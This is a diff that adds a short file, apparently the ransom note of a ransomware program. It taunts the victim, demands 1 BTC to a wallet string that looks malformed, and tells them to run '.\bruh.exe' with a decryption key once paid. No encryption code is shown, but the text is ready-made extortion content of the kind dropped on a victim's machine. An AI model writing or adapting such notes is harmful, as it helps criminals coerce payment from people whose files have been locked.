@@ -1,0 +1,4 @@
+HA! GOTEEM! To get your files back, gotta pay us 1 BTC to: d32a7dafsd432789df798
+
+We'll give you the decryption key, then you run the following command from the folder with `bruh.exe`:
+.\bruh.exe -key <DECRYPTION_KEY>
